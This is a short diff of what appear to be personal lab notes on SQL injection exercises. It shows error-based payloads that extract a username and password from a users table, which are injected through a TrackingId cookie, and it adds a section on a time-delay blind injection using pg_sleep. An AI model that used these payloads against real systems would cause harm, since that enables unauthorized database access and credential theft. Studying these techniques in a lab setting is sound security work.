@@ -287,3 +287,13 @@ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```
  The error message now leaks the first password from the `users` table which is the actual password used for *administrator*:
+
+
+## 13. Blind SQL injection with time delays
+![[Pasted image 20240629015925.png]]
+```
+TrackingId=ogAZZfxtOKUELbuJ' || (SELECT pg_sleep(10)) --
+```
+
+
+## 14. Blind SQL injection with time delays and information retrieval
